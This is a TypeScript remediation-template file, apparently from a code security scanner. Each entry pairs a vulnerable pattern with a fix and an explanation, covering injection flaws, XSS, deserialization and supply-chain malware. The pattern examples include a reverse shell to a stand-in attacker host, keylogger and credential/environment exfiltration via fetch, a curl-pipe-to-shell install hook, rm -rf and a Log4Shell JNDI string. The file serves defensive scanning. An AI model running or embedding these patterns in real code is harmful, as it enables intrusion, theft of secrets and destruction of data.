import type { RemediationTemplate } from "../remediation-map.js";
// Fix templates for the remaining injection/exfil/supply-chain/mobile/auth IDs.
// Lives under src/gate/ so the gate self-scan ignores the intentional vulnerable
// "pattern" examples.
export const MISC_REMEDIATIONS: Record<string, RemediationTemplate> = {
  // ---------------------------------------------------------------------------
  // Injection — SQL / NoSQL / ORM / LDAP / XPath / expression / template
  // ---------------------------------------------------------------------------
  "NOSQL_OPERATOR_INJECTION": {
    pattern: "User.findOne({ username: req.body.username, password: req.body.password }) // { \"$ne\": null } bypasses auth",
    fix: "const { username, password } = z.object({ username: z.string(), password: z.string() }).parse(req.body);\nconst user = await User.findOne({ username }); // scalars only, never raw req.body objects",
    explanation: "Passing req.body straight into a MongoDB query lets an attacker send operator objects like {\"$ne\": null} or {\"$gt\": \"\"} to bypass authentication or dump data. Validate each field as a primitive with a schema so no query operator survives.",
    references: ["CWE-943", "OWASP Top 10 A03:2021", "OWASP API Security API8:2023"]
  },
  "NOSQL_AGGREGATE_INJECTION": {
    pattern: "col.aggregate([{ $match: { $where: `this.pin == '${req.body.pin}'` } }]) // server-side JS",
    fix: "col.aggregate([{ $match: { pin: { $eq: req.body.pin } } }]); // native operators, no $where/$function/$accumulator",
    explanation: "$where, $function, $expr, and $accumulator execute JavaScript on the MongoDB server, so user input inside them yields auth bypass, data theft, or a sleep-loop DoS. Replace them with native operators ($eq/$gt/$in) and disable server-side scripting.",
    references: ["CWE-943", "OWASP Top 10 A03:2021", "MITRE ATT&CK T1190"]
  },
  "MONGO_SERVER_SIDE_JS": {
    pattern: "db.users.find({ $where: `this.pin == '${input}'` }) // or mapReduce map/reduce from user data",
    fix: "db.users.find({ pin: { $eq: input } }); // native operators only\n// start mongod with --noscripting (security.javascriptEnabled: false)",
    explanation: "MongoDB $where clauses and mapReduce map/reduce functions run JavaScript on the database server; building them from user input allows auth bypass and denial-of-service. Use native query operators and turn off server-side JavaScript at the server.",
    references: ["CWE-943", "OWASP Top 10 A03:2021", "MITRE ATT&CK T1190"]
  },
  "SQL_INJECTION_CONCAT": {
    pattern: "db.query(\"SELECT * FROM users WHERE name = '\" + req.query.name + \"'\")",
    fix: "db.query('SELECT * FROM users WHERE name = ?', [req.query.name]); // parameterized / prepared statement",
    explanation: "Concatenating user input into a SQL string lets an attacker inject `' OR '1'='1` to bypass authentication or exfiltrate data. Always use parameterized queries or prepared statements; never build SQL by string concatenation.",
    references: ["CWE-89", "OWASP Top 10 A03:2021", "OWASP ASVS 5.3.4"]
  },
  "ORM_RAW_INJECTION": {
    pattern: "prisma.$queryRawUnsafe(`SELECT * FROM User WHERE id = ${userId}`) // raw escape hatch",
    fix: "prisma.$queryRaw`SELECT * FROM User WHERE id = ${userId}`; // Prisma.sql tagged template binds params\n// Sequelize: sequelize.query('... WHERE id = :id', { replacements: { id: userId } })",
    explanation: "ORM raw escape hatches ($queryRawUnsafe, Sequelize.literal, knex.raw with interpolation) reintroduce SQL injection the ORM otherwise prevents. Use the ORM's parameterized raw API — tagged templates or a bindings/replacements array.",
    references: ["CWE-89", "OWASP Top 10 A03:2021", "OWASP ASVS 5.3.4"]
  },
  "ORM_RAW_INJECTION_TYPEORM": {
    pattern: "repo.createQueryBuilder('u').where(`u.id = ${userId}`).getMany() // interpolated clause",
    fix: "repo.createQueryBuilder('u').where('u.id = :id', { id: userId }).getMany(); // bound parameter",
    explanation: "Interpolating a value into a TypeORM .where() template literal bypasses query parameterization and enables SQL injection. Pass a named parameter object as the second argument so TypeORM binds the value safely.",
    references: ["CWE-89", "OWASP Top 10 A03:2021", "OWASP ASVS 5.3.4"]
  },
  "DATAPLATFORM_NOTEBOOK_SQL_INJECTION": {
    pattern: "spark.sql(f\"SELECT * FROM sales WHERE region = '{dbutils.widgets.get('region')}'\")  # f-string",
    fix: "region = dbutils.widgets.get('region')\nspark.sql('SELECT * FROM sales WHERE region = :region', args={'region': region})  # bound parameter",
    explanation: "Databricks/Snowflake notebooks that build SQL by f-string, .format(), or concatenation of widget/user input are injectable (CWE-89). Pass values through parameter markers (args= / :name / the connector's parameterized execute) and allowlist any identifier that cannot be bound.",
    references: ["CWE-89", "OWASP Top 10 A03:2021", "OWASP ASVS 5.3.4"]
  },
  "SECOND_ORDER_INJECTION": {
    pattern: "const row = await db.query('SELECT name FROM users WHERE id=?', [id]);\ndb.query(`SELECT * FROM logs WHERE actor = '${row.name}'`) // stored value re-injected",
    fix: "const row = await db.query('SELECT name FROM users WHERE id=?', [id]);\ndb.query('SELECT * FROM logs WHERE actor = ?', [row.name]); // parameterize stored data too",
    explanation: "Data read back from the database is still attacker-controlled; feeding it unparameterized into a second SQL, template, or shell sink is second-order injection. Treat stored values as untrusted and parameterize/escape them at every downstream sink.",
    references: ["CWE-89", "CWE-94", "OWASP Top 10 A03:2021"]
  },
  "LDAP_INJECTION": {
    pattern: "client.search(base, { filter: `(uid=${req.query.user})` }) // raw input in filter",
    fix: "import { filters } from 'ldapjs';\nconst safe = filters.EqualityFilter({ attribute: 'uid', value: req.query.user }); // library escapes ( ) * \\ NUL",
    explanation: "Concatenating user input into an LDAP filter lets `*)(uid=*` bypass authentication and dump the directory. Escape the LDAP special characters `( ) * \\ NUL` or build filters with a library that parameterizes attribute values.",
    references: ["CWE-90", "OWASP Top 10 A03:2021", "OWASP LDAP Injection Prevention Cheat Sheet"]
  },
  "LDAP_WILDCARD_INJECTION": {
    pattern: "const filter = `(uid=*${input}*)` // wildcard + unescaped user input",
    fix: "const safe = ldap.searchFilterEscape(input);\nconst filter = `(uid=${safe})`; // exact match, no attacker-controlled wildcards",
    explanation: "A filter that mixes a wildcard with unescaped user input (e.g. `(uid=*${input}*)`) lets `*)(uid=*` match every entry, bypassing auth and enumerating the directory. Escape LDAP metacharacters and use exact-match filters instead of user-supplied wildcards.",
    references: ["CWE-90", "OWASP Top 10 A03:2021", "OWASP LDAP Injection Prevention Cheat Sheet"]
  },
  "XPATH_INJECTION": {
    pattern: "doc.select(`//user[name='${req.query.name}' and pass='${req.query.pass}']`) // concatenated",
    fix: "const expr = xpath.parse(\"//user[name=$name and pass=$pass]\");\nexpr.select({ node: doc, variables: { name: req.query.name, pass: req.query.pass } }); // bound variables",
    explanation: "Concatenating user input into an XPath expression lets `' or '1'='1` bypass authentication and expose the whole XML document. Use a parameterized XPath API with variable binding, or strictly allowlist the user values.",
    references: ["CWE-643", "OWASP Top 10 A03:2021", "OWASP XPath Injection Defense"]
  },
  "XPATH_FUNCTION_INJECTION": {
    pattern: "doc.select(`//user[substring(pass,1,1)='${guess}']`) // blind XPath via function args",
    fix: "const expr = xpath.parse('//user[substring(pass,1,1)=$c]');\nexpr.select({ node: doc, variables: { c: guess } }); // bind values, never concatenate",
    explanation: "Building XPath function arguments (substring/string-length/starts-with) from user input drives blind XPath injection that extracts the document character by character. Bind values through a parameterized/compiled XPath API instead of concatenating.",
    references: ["CWE-643", "OWASP Top 10 A03:2021", "OWASP XPath Injection Defense"]
  },
  "ELASTICSEARCH_INJECTION": {
    pattern: "es.search({ body: { query: { query_string: { query: req.query.q } } } }) // raw query syntax",
    fix: "es.search({ body: { query: { match: { title: req.query.q } } } }); // user input is a value, not query syntax\n// disable dynamic scripting (script.allowed_types: none)",
    explanation: "Passing user input to Elasticsearch query_string or script.source lets an attacker inject Painless scripts to read cluster data or cause DoS. Use structured queries (match/term/range) where the input is only a value, and disable dynamic scripting.",
    references: ["CWE-943", "OWASP Top 10 A03:2021", "Elasticsearch scripting security docs"]
  },
  "REDIS_EVAL_INJECTION": {
    pattern: "client.eval(`return redis.call('GET', '${key}')`, 0) // user value baked into the Lua script",
    fix: "const SCRIPT = \"return redis.call('GET', KEYS[1])\";\nclient.eval(SCRIPT, 1, key); // static script; user values only as KEYS/ARGV",
    explanation: "Redis EVAL runs Lua on the server; interpolating user input into the script text allows data exfiltration or dataset corruption. Keep the Lua script static and pass all user-controlled values as KEYS/ARGV arguments.",
    references: ["CWE-95", "OWASP Top 10 A03:2021", "Redis EVAL docs"]
  },
  "SPEL_OGNL_INJECTION": {
    pattern: "new SpelExpressionParser().parseExpression(userInput).getValue(); // RCE via T(java.lang.Runtime)",
    fix: "SimpleEvaluationContext ctx = SimpleEvaluationContext.forReadOnlyDataBinding().build();\nparser.parseExpression(userInput).getValue(ctx); // restricted type locator, no T() / Runtime",
    explanation: "Evaluating user input as a SpEL/OGNL/MVEL expression allows `T(java.lang.Runtime).getRuntime().exec(...)` remote code execution. Use a restricted evaluation context (SimpleEvaluationContext) or an input allowlist, and never parse raw user input as an expression.",
    references: ["CWE-94", "OWASP Top 10 A03:2021", "MITRE ATT&CK T1059"]
  },
  "GROOVY_CODE_INJECTION": {
    pattern: "new GroovyShell().evaluate(userInput); // Eval.me / GroovyShell.parse of user data",
    fix: "// remove dynamic Groovy evaluation; if scripting is unavoidable:\nCompilerConfiguration cc = new CompilerConfiguration();\ncc.addCompilationCustomizers(new SecureASTCustomizer()); // strict allowlist, sandboxed",
    explanation: "GroovyShell/Eval.me evaluate arbitrary JVM code, so passing user input yields remote code execution. Remove dynamic Groovy evaluation; if scripting is required, run it through a locked-down SecureASTCustomizer allowlist in a restricted sandbox.",
    references: ["CWE-94", "OWASP Top 10 A03:2021", "MITRE ATT&CK T1059"]
  },
  "PERL_EVAL_INJECTION": {
    pattern: "eval $cgi->param('code'); # string eval compiles and runs user Perl",
    fix: "my $data = decode_json($cgi->param('data')); # parse untrusted data, never eval it\n# use block eval { ... } only for exception handling",
    explanation: "Perl string eval compiles and executes its argument, so passing a CGI/user parameter into it is arbitrary code execution. Parse untrusted data with a strict decoder and reserve block eval (`eval { ... }`) for exception handling only.",
    references: ["CWE-95", "OWASP Top 10 A03:2021", "MITRE ATT&CK T1059"]
  },
  "XSLT_INJECTION": {
    pattern: "transformer.transform(new StreamSource(userXslt), result); // stylesheet from user input",
    fix: "TransformerFactory tf = TransformerFactory.newInstance();\ntf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\ntf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\"); // load only the bundled, trusted stylesheet",
    explanation: "Compiling an XSLT stylesheet from user input allows extension-function RCE and local file disclosure via document(). Pin the stylesheet to a bundled trusted file and enable secure processing, disabling extension functions and external document access.",
    references: ["CWE-91", "OWASP Top 10 A03:2021", "MITRE ATT&CK T1059"]
  },
  "IMAGEMAGICK_DELEGATE_INJECTION": {
    pattern: "exec(`convert ${req.file.originalname} -resize 100x100 out.png`) // ImageTragick",
    fix: "import { execFile } from 'node:child_process';\nconst safe = `/tmp/${crypto.randomUUID()}.png`; // generated path, not client name\nexecFile('convert', [safe, '-resize', '100x100', 'out.png']); // validate magic bytes first",
    explanation: "Passing a user-controlled filename or content to ImageMagick enables delegate/shell injection (ImageTragick, CVE-2016-3714) via names like `|id;` or crafted MVG/SVG. Use a generated safe path with execFile (no shell), validate magic bytes, and disable risky coders (MVG/MSL/URL/HTTPS) in policy.xml.",
    references: ["CWE-78", "CVE-2016-3714", "OWASP Top 10 A03:2021"]
  },
  "LOG4SHELL_JNDI_LITERAL": {
    pattern: "logger.info(\"login from ${jndi:ldap://attacker/x}\"); // JNDI lookup string in logs",
    fix: "// upgrade log4j-core >= 2.17.1; set log4j2.formatMsgNoLookups=true\nlogger.info(\"login from {}\", sanitize(userInput)); // strip ${jndi: from all logged user input",
    explanation: "A `${jndi:...}` lookup string reaching a vulnerable Log4j triggers remote class loading and RCE (Log4Shell, CVE-2021-44228). Upgrade Log4j to a patched release, disable message lookups, and strip `${jndi:` patterns from user-controlled log data.",
    references: ["CWE-917", "CVE-2021-44228", "OWASP Top 10 A03:2021"]
  },
  "JAVA_OBJECT_DESERIALIZATION": {
    pattern: "Object o = new ObjectInputStream(request.getInputStream()).readObject(); // gadget chain RCE",
    fix: "// prefer JSON/Protobuf for untrusted input:\nMyDto dto = new ObjectMapper().readValue(json, MyDto.class);\n// if ObjectInputStream is unavoidable, install a strict allowlist filter (JEP 290):\nois.setObjectInputFilter(ObjectInputFilter.Config.createFilter(\"com.example.*;!*\"));",
    explanation: "Java native deserialization of untrusted bytes executes Commons-Collections-style gadget chains for RCE. Replace it with a data-only format (JSON/Protobuf); if ObjectInputStream is required, enforce a strict class allowlist via a JEP 290 ObjectInputFilter.",
    references: ["CWE-502", "OWASP Top 10 A08:2021", "OWASP Deserialization Cheat Sheet"]
  },
  "PROTOTYPE_POLLUTION_DIRECT": {
    pattern: "obj[req.body.key] = req.body.value; // key may be '__proto__' or 'constructor'",
    fix: "if (['__proto__','constructor','prototype'].includes(req.body.key)) throw new Error('blocked key');\nconst obj = Object.create(null); // null-prototype map has no proto to pollute\nobj[req.body.key] = req.body.value;",
    explanation: "Assigning to a user-controlled key that equals __proto__ or constructor.prototype mutates the shared prototype and corrupts every object in the process. Reject prototype keys and use Object.create(null) maps for user-keyed data.",
    references: ["CWE-1321", "OWASP Top 10 A08:2021", "OWASP Prototype Pollution Prevention"]
  },
  "PROTOTYPE_POLLUTION_JSON_PARSE": {
    pattern: "Object.assign(config, JSON.parse(req.body.data)); // merges attacker __proto__ key",
    fix: "const safe = MySchema.parse(JSON.parse(req.body.data)); // Zod/Joi validates shape\nObject.assign(Object.create(null), defaults, safe); // null-proto target",
    explanation: "Merging parsed attacker JSON that contains a `__proto__` key into an object pollutes Object.prototype, enabling auth bypass or gadget-chain RCE. Validate the parsed JSON against a strict schema and merge into a null-prototype object.",
    references: ["CWE-1321", "OWASP Top 10 A08:2021", "OWASP Prototype Pollution Prevention"]
  },
  "OPEN_REDIRECT": {
    pattern: "res.redirect(req.query.url); // user controls destination",
    fix: "const url = String(req.query.url ?? '');\nif (!url.startsWith('/') || url.startsWith('//')) return res.redirect('/');\nres.redirect(url); // relative-only, reject protocol-relative //host",
    explanation: "Redirecting to a user-supplied URL lets an attacker send victims to a phishing/token-theft site while the link looks legitimate. Allow only relative paths (rejecting protocol-relative `//host`) or validate against a host allowlist, defaulting to a safe internal path.",
    references: ["CWE-601", "OWASP Top 10 A01:2021", "MITRE ATT&CK T1598"]
  },
  "POST_LOGIN_OPEN_REDIRECT": {
    pattern: "res.redirect(req.query.returnTo); // ?returnTo=https://evil.com after login",
    fix: "const ALLOWED = new Set(['/dashboard', '/settings', '/home']);\nconst dest = ALLOWED.has(req.query.returnTo) ? req.query.returnTo : '/dashboard';\nres.redirect(dest); // allowlisted relative paths only",
    explanation: "A post-login redirect to a user-supplied returnTo lets an attacker craft a login link that sends the freshly authenticated victim (and their session) to an external phishing site. Validate the target against a relative-path/host allowlist and default to a fixed internal URL.",
    references: ["CWE-601", "OWASP Top 10 A01:2021", "OWASP Unvalidated Redirects Cheat Sheet"]
  },
  "CRLF_INJECTION": {
    pattern: "res.setHeader('Location', req.query.next); // \\r\\n in value splits the response",
    fix: "const next = String(req.query.next).replace(/[\\r\\n]/g, '');\nif (!next.startsWith('/')) throw new Error('invalid');\nres.setHeader('Location', next); // no CR/LF reaches the header",
    explanation: "Writing a user value containing CR/LF into a response header enables HTTP response splitting, header injection, and session fixation. Strip or reject `\\r`/`\\n` from any value placed into a header, and prefer framework header APIs that reject control characters.",
    references: ["CWE-113", "OWASP Top 10 A03:2021", "OWASP HTTP Response Splitting"]
  },
  "SSE_CRLF_INJECTION": {
    pattern: "res.write(`data: ${userMessage}\\n\\n`); // \\n in userMessage injects fake events",
    fix: "const clean = String(userMessage).replace(/[\\r\\n]/g, ' ');\nres.write(`data: ${clean}\\n\\n`); // CR/LF stripped before writing to the stream",
    explanation: "Server-Sent Events use newline-delimited fields, so unescaped CR/LF in user input can inject fake events or terminate the stream. Strip or encode CR/LF from any user value before writing it to the SSE stream.",
    references: ["CWE-113", "OWASP Top 10 A03:2021", "MDN Server-Sent Events"]
  },
  "CONTENT_TYPE_CONFUSION": {
    pattern: "res.setHeader('Content-Type', req.headers['content-type']); // echoes client MIME",
    fix: "res.setHeader('Content-Type', 'application/json'); // chosen server-side per route\nres.setHeader('X-Content-Type-Options', 'nosniff');",
    explanation: "Reflecting the client's Content-Type onto a response lets an attacker force text/html rendering (stored XSS) or content sniffing. Set Content-Type explicitly per route from a server-side allowlist and send X-Content-Type-Options: nosniff on every response.",
    references: ["CWE-16", "CWE-79", "OWASP Secure Headers Project"]
  },
  "PATH_TRAVERSAL_JOIN": {
    pattern: "const file = path.join(UPLOAD_DIR, req.query.name); fs.readFile(file) // ../../etc/passwd",
    fix: "const full = path.resolve(UPLOAD_DIR, req.query.name);\nif (!full.startsWith(path.resolve(UPLOAD_DIR) + path.sep)) throw new Error('Invalid path');\nfs.readFile(full);",
    explanation: "path.join with user input still resolves `../` sequences, letting an attacker read files outside the intended directory. After resolving, verify the absolute path is still inside the base directory before any file operation.",
    references: ["CWE-22", "OWASP Top 10 A01:2021", "OWASP Path Traversal Defense"]
  },
  "JSONP_CALLBACK_INJECTION": {
    pattern: "res.send(`${req.query.callback}(${JSON.stringify(data)})`) // callback reflected raw",
    fix: "const cb = String(req.query.callback ?? '');\nif (!/^[a-zA-Z_$][a-zA-Z0-9_$.]*$/.test(cb)) return res.status(400).end();\nres.type('application/javascript').send(`${cb}(${JSON.stringify(data)})`);",
    explanation: "Reflecting an unvalidated JSONP callback name lets an attacker inject `alert(document.cookie)` that executes when the response loads (XSS). Validate the callback against a strict identifier pattern before reflecting it, or prefer CORS+JSON over JSONP.",
    references: ["CWE-79", "OWASP Top 10 A03:2021", "OWASP XSS Prevention Cheat Sheet"]
  },
  "CSS_INJECTION": {
    pattern: "const style = `color: ${req.query.color}`; // or styled`${userInput}`",
    fix: "const ALLOWED = new Set(['red','blue','green']);\nconst color = ALLOWED.has(req.query.color) ? req.query.color : 'black';\nconst style = `color: ${color}`; // allowlisted values only",
    explanation: "Interpolating user input into CSS-in-JS or an inline style attribute allows CSS injection (url()/expression()) that can exfiltrate data or overlay UI. Allowlist CSS property values and never accept raw CSS strings from users.",
    references: ["CWE-79", "OWASP Top 10 A03:2021", "OWASP CSS Injection"]
  },
  "HANDLEBARS_UNSAFE_CONTEXT": {
    pattern: "template({ bio: new Handlebars.SafeString(userBio) }); // or {{{bio}}} triple-stache",
    fix: "import DOMPurify from 'isomorphic-dompurify';\ntemplate({ bio: userBio }); // {{bio}} double-stache auto-escapes\n// if raw HTML is truly required: DOMPurify.sanitize(userBio)",
    explanation: "Handlebars SafeString, noEscape:true, and triple-stache {{{ }}} emit user data unescaped, rendering <script>/event handlers as stored or reflected XSS. Use double-stache {{ }} so Handlebars HTML-escapes, and sanitize with DOMPurify when raw HTML is unavoidable.",
    references: ["CWE-79", "OWASP Top 10 A03:2021", "OWASP XSS Prevention Cheat Sheet"]
  },
  "DANGEROUSLY_SET_INNER_HTML": {
    pattern: "<div dangerouslySetInnerHTML={{ __html: userContent }} /> // raw HTML from user",
    fix: "import DOMPurify from 'dompurify';\n<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userContent) }} />\n// better: render as text — <div>{userContent}</div>",
    explanation: "dangerouslySetInnerHTML injects raw HTML into the DOM, so user-controlled content becomes stored/reflected XSS. Render user data as text where possible; when HTML is required, sanitize it with DOMPurify and add XSS-payload regression tests.",
    references: ["CWE-79", "OWASP Top 10 A03:2021", "OWASP DOM XSS Prevention Cheat Sheet"]
  },
  "WEBSOCKET_MESSAGE_INJECTION": {
    pattern: "ws.on('message', (m) => db.query(`SELECT * FROM t WHERE id=${m}`)) // raw message to sink",
    fix: "ws.on('message', (m) => {\n  const { id } = MsgSchema.parse(JSON.parse(m.toString())); // strict Zod schema\n  db.query('SELECT * FROM t WHERE id = ?', [id]);\n});",
    explanation: "WebSocket frames bypass HTTP-layer validation, so passing raw message data to eval/exec/DB/template sinks is injectable. Parse every message against a strict schema and route values through parameterized/escaped sinks — never the raw payload.",
    references: ["CWE-20", "OWASP Top 10 A03:2021", "OWASP WebSocket Security"]
  },
  "PDF_DOCUMENT_INJECTION": {
    pattern: "sheet.addRow([req.body.note]); // '=cmd|...' formula injection; or puppeteer.goto(userUrl)",
    fix: "const cell = /^[=+\\-@]/.test(req.body.note) ? `'${req.body.note}` : req.body.note; // neutralize formula\n// puppeteer: block file:// and localhost via a URL allowlist before goto()",
    explanation: "PDF/Office generators expose formula injection (cells beginning =,+,-,@ execute when opened) and SSRF (headless browsers following file:// URLs). Prefix formula-triggering cell values with a single quote and validate any URL against an allowlist that blocks file:// and internal hosts.",
    references: ["CWE-74", "CWE-1236", "OWASP CSV Injection"]
  },
  "SVG_XXE": {
    pattern: "const doc = new DOMParser().parseFromString(uploadedSvg, 'image/svg+xml'); // DTD enabled",
    fix: "import DOMPurify from 'isomorphic-dompurify';\nconst clean = DOMPurify.sanitize(uploadedSvg, { USE_PROFILES: { svg: true } }); // strips DOCTYPE/entities",
    explanation: "SVG is XML, so an uploaded SVG with `<!ENTITY xxe SYSTEM 'file:///etc/passwd'>` can exfiltrate local files through XXE. Strip DOCTYPE/external entities (resolveEntities:false / DISALLOW_DOCTYPE) or sanitize the SVG with DOMPurify's SVG profile before parsing.",
    references: ["CWE-611", "OWASP Top 10 A05:2021", "OWASP XXE Prevention Cheat Sheet"]
  },

  // ---------------------------------------------------------------------------
  // Code execution — eval / dynamic require / dynamic import
  // ---------------------------------------------------------------------------
  "EVAL_DYNAMIC_ARG": {
    pattern: "eval(req.body.expr); // dynamic / user-controlled argument",
    fix: "const data = JSON.parse(req.body.expr); // data-only\n// for constrained math use a purpose-built parser (e.g. expr-eval) with no host access",
    explanation: "eval() with a dynamic or user-controlled argument runs arbitrary JavaScript in-process (full RCE). Remove eval entirely — use JSON.parse for data and a sandboxed expression parser for computed formulas.",
    references: ["CWE-95", "OWASP Top 10 A03:2021", "MITRE ATT&CK T1059.007"]
  },
  "EVAL_ENCODED_PAYLOAD": {
    pattern: "eval(Buffer.from(encoded, 'base64').toString()); // obfuscated code execution",
    fix: "const data = JSON.parse(Buffer.from(encoded, 'base64').toString('utf-8')); // decode to data, never eval\n// load modules with a static import() specifier",
    explanation: "eval() of a decoded/deserialized payload executes arbitrary JavaScript, and the base64 layer only hides it from naive scanners. Decode to data and parse it with JSON.parse; never pass decoded strings to eval.",
    references: ["CWE-95", "OWASP Top 10 A03:2021", "MITRE ATT&CK T1027"]
  },
  "DYNAMIC_REQUIRE": {
    pattern: "const mod = require(userInput); // non-literal specifier",
    fix: "const ALLOWED = { pdf: require('./pdf'), csv: require('./csv') };\nconst mod = ALLOWED[userInput];\nif (!mod) throw new Error('unknown module');",
    explanation: "require() with a computed specifier can load arbitrary files or modules (e.g. ../../.env) chosen by user input. Resolve the specifier through a static allowlist map and reject anything not in it.",
    references: ["CWE-706", "CWE-95", "MITRE ATT&CK T1059.007"]
  },
  "REQUIRE_NON_LITERAL": {
    pattern: "const plugin = require(`./plugins/${name}`); // non-literal specifier",
    fix: "const PLUGINS = { a: require('./plugins/a'), b: require('./plugins/b') };\nconst plugin = PLUGINS[name] ?? raise('unknown plugin');",
    explanation: "A non-literal require() specifier lets a controlled value load any file on disk or an installed package. Replace it with a static object mapping allowlisted names to already-required modules.",
    references: ["CWE-706", "CWE-95", "MITRE ATT&CK T1059.007"]
  },
  "DYNAMIC_IMPORT_NON_LITERAL": {
    pattern: "const mod = await import(`./loaders/${type}.js`); // non-literal specifier",
    fix: "const ALLOWED = { pdf: () => import('./loaders/pdf.js'), csv: () => import('./loaders/csv.js') };\nconst mod = await (ALLOWED[type] ?? (() => { throw new Error('blocked'); }))();",
    explanation: "A dynamic import() with a non-literal specifier can pull in arbitrary local paths or packages controlled by input. Gate imports behind a static map of allowlisted loader functions and validate the key first.",
    references: ["CWE-706", "MITRE ATT&CK T1059.007", "OWASP Top 10 A03:2021"]
  },

  // ---------------------------------------------------------------------------
  // Supply-chain malware / exfil patterns (containment remediations)
  // ---------------------------------------------------------------------------
  "DESTRUCTIVE_COMMAND": {
    pattern: "child_process.exec('rm -rf ' + targetDir); // recursive wipe / wiper pattern",
    fix: "// Remove destructive filesystem commands from application code entirely.\n// If a cleanup is genuinely required, scope it, default to non-destructive,\n// and require explicit human confirmation — never auto-execute rm -rf.\nawait fs.rm(path.resolve(SAFE_TMP, id), { recursive: false });",
    explanation: "Recursive deletion / filesystem-wipe commands in application code are the signature of wiper malware or repo poisoning (ATT&CK T1485). Remove them; any legitimate cleanup must be tightly scoped, non-recursive by default, and gated behind explicit confirmation.",
    references: ["CWE-73", "MITRE ATT&CK T1485", "OWASP Top 10 A08:2021"]
  },
  "KEYLOGGER_EXFIL": {
    pattern: "document.addEventListener('keydown', e => fetch('https://x/collect?k=' + e.key));",
    fix: "// Remove the keystroke-capture-plus-network pattern entirely.\n// Legitimate keyboard shortcuts handle keys locally and never transmit them:\ndocument.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });",
    explanation: "Capturing keystrokes and sending them to a remote endpoint is a keylogger that steals passwords and PINs (ATT&CK T1056.001). Delete the exfiltration; keyboard handlers must act locally and never transmit key data externally.",
    references: ["CWE-200", "MITRE ATT&CK T1056.001", "OWASP Top 10 A08:2021"]
  },
  "CREDENTIAL_EXFILTRATION": {
    pattern: "fetch('https://x/c', { method: 'POST', body: localStorage.getItem('token') });",
    fix: "// Remove the storage-read-plus-external-send skimmer. If this appeared via a\n// dependency, treat the build as compromised: pin/remove the package, verify\n// Subresource Integrity (SRI) on all scripts, and rotate every exposed token.",
    explanation: "Reading localStorage/sessionStorage/cookies and immediately POSTing to an external URL is a credential skimmer (ATT&CK T1555), commonly injected via supply-chain or XSS. Remove it, verify script SRI hashes against known-good, and rotate any tokens it could read.",
    references: ["CWE-312", "MITRE ATT&CK T1555", "OWASP Top 10 A08:2021"]
  },
  "REVERSE_SHELL": {
    pattern: "require('child_process').exec('bash -i >& /dev/tcp/attacker/4444 0>&1');",
    fix: "// Remove the reverse-shell payload immediately. Audit every recently updated\n// dependency for the same pattern, rebuild from a clean lockfile, and rotate\n// all credentials on any host that ran the affected code.",
    explanation: "A reverse shell gives a remote attacker full shell access and is a common outcome of supply-chain compromise (event-stream, node-ipc). Remove it, hunt for the source dependency, and rotate all credentials on affected hosts.",
    references: ["CWE-78", "MITRE ATT&CK T1059", "OWASP Top 10 A08:2021"]
  },
  "ENV_VARIABLE_EXFILTRATION": {
    pattern: "fetch('https://x/c', { method: 'POST', body: JSON.stringify(process.env) });",
    fix: "// Remove the process.env exfiltration. If it came from a dependency, treat the\n// environment as compromised: remove the package, rebuild from a trusted\n// lockfile, and rotate every secret in process.env (API keys, DB passwords).",
    explanation: "Sending process.env to an external URL leaks API keys, database passwords, and tokens — a signature npm supply-chain technique (ATT&CK T1552.001). Remove it, identify whether it is app code or a dependency, and rotate every exposed secret.",
    references: ["CWE-200", "MITRE ATT&CK T1552.001", "OWASP Top 10 A08:2021"]
  },
  "MALICIOUS_POSTINSTALL": {
    pattern: "\"scripts\": { \"postinstall\": \"curl https://x/i.sh | sh\" } // download-and-execute",
    fix: "// Remove the lifecycle download-and-execute. If a native binary is required,\n// pin the exact HTTPS URL and verify a SHA-256 checksum before running:\n\"scripts\": { \"postinstall\": \"node scripts/verified-download.js\" }",
    explanation: "A postinstall that downloads and executes code runs automatically on every install and is a primary npm supply-chain vector. Remove it; bundle assets in the package, and if a native download is unavoidable, pin the URL and verify a SHA-256 hash.",
    references: ["CWE-494", "MITRE ATT&CK T1195.002", "OWASP Top 10 A08:2021"]
  },
  "POSTINSTALL_NETWORK_REQUEST": {
    pattern: "\"scripts\": { \"postinstall\": \"node -e \\\"fetch('https://x/beacon')\\\"\" }",
    fix: "// Remove the postinstall network call — it runs on every consumer 'npm install'.\n// Bundle required assets; verify a pinned SHA-256 for any native binary download.\n// Install dependencies with `npm ci --ignore-scripts` in CI.",
    explanation: "A postinstall hook that makes a network request runs on every consumer install (the event-stream / node-ipc technique). Remove it, bundle assets, verify checksums for any required download, and run installs with --ignore-scripts in CI.",
    references: ["CWE-494", "MITRE ATT&CK T1195.002", "OWASP Top 10 A08:2021"]
  },
  "LIFECYCLE_SCRIPT_USER_INPUT": {
    pattern: "\"scripts\": { \"build\": \"NODE_ENV=$(some_cmd) webpack\" } // shell var / subshell expansion",
    fix: "// Replace shell interpolation with a Node build script that reads env safely:\n\"scripts\": { \"build\": \"node scripts/build.js\" }\n// build.js: const env = process.env.NODE_ENV; // no subshells, no eval of env",
    explanation: "Lifecycle scripts that interpolate env vars or subshells can be exploited when a CI/dev env value is attacker-influenced (e.g. NODE_ENV=$(curl attacker|sh)), yielding install-time RCE. Move logic into a Node build script that reads process.env directly.",
    references: ["CWE-78", "MITRE ATT&CK T1195.002", "OWASP Top 10 A03:2021"]
  },
  "PYTHON_SETUP_EXEC": {
    pattern: "# setup.py\nos.system('curl https://x/p.sh | sh') # runs during pip install",
    fix: "# Remove remote fetch-and-exec from setup.py. Bundle required resources in the\n# package. If external data is needed, fetch it lazily at runtime and verify a\n# pinned SHA-256 before use. Prefer a declarative pyproject.toml build.",
    explanation: "setup.py runs automatically during 'pip install', so a remote fetch-and-exec there is a supply-chain backdoor (ATT&CK T1195.001). Remove it, bundle resources, and defer any external data to runtime behind a pinned hash check.",
    references: ["CWE-494", "MITRE ATT&CK T1195.001", "OWASP Top 10 A08:2021"]
  },
  "CRYPTOMINER_DETECTED": {
    pattern: "// stratum+tcp://pool endpoint or coin-hive/xmrig reference in code",
    fix: "// Remove the mining library/endpoint reference. Audit the full dependency tree\n// (npm ls / pip freeze) to find the package that introduced it, remove it, and\n// rebuild from a clean, trusted lockfile.",
    explanation: "Cryptomining code hijacks CPU/GPU without consent and is never legitimate in application code (ATT&CK T1496). Remove it and audit the dependency tree to find and eliminate the source package.",
    references: ["CWE-506", "MITRE ATT&CK T1496", "OWASP Top 10 A08:2021"]
  },
